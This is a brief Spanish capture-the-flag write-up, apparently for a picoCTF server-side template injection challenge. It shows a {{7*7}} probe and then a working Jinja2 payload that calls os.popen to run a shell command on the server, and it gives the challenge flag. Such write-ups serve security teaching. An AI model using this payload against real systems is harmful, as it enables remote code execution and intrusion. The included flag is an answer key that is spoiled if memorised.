## Descripción:
I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance.

# Solución
Inyectamos un payload para ver cómo responde el servidor.
Aparece que se ejecutó " {{7*7}}" y no la entrada normal " Error" . Esto indica que el servidor es vulnerable a una vulnerabilidad SSTI .
Utilizamos una carga útil más sofisticada que realizará una RCE (ejecución remota de código) en el servidor.
```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
```

Respuesta:`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}`


## Notas

## Referencias
 